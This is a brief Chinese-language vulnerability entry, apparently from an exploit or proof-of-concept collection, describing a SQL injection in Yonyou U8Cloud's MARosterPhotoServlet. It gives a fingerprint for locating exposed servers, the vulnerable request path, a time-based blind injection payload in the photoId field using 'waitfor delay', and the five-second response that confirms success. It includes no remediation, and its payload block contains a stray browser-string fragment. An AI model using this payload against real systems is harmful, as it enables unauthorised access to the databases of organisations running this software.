# 用友U8CloudMARosterPhotoServlet存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title=="U8C"`
- **请求**：`GET /servlet/~uap/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?pageId=login HTTP/1.0`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
type: pid
photoId: 1';waitfor delay'0:0:5'-- Alks
```
- **响应特征**：200 响应时间>=5s